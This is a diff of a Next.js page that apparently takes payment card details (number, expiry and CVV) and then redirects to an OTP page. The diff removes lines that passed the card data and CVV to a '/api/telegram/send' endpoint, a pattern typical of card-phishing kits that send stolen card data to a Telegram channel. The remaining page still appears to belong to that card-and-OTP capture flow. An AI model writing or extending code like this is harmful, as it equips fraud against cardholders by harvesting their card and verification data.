@@ -3,7 +3,6 @@
 import { useState } from 'react'
 import { useRouter } from 'next/navigation'
 import { ChevronDown, ChevronRight } from 'lucide-react'
-import { saveSubmissionData } from '@/lib/submission-store'
 
 const cardImage =
   'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202026-08-08%20062920-H6XftL6ecHRNk5qygtGjqW2SqZ0gn0.png'
@@ -30,18 +29,7 @@ export default function Page() {
     setError('')
     setSubmitting(true)
 
-    try {
-      const data = saveSubmissionData({ card: cardNumber, month, year, cvv })
-      await fetch('/api/telegram/send', {
-        method: 'POST',
-        headers: { 'content-type': 'application/json' },
-        body: JSON.stringify(data),
-      })
-    } catch {
-      // Continue navigation even if the notification fails
-    } finally {
-      router.push('/otp')
-    }
+    router.push('/otp')
   }
 
   return (
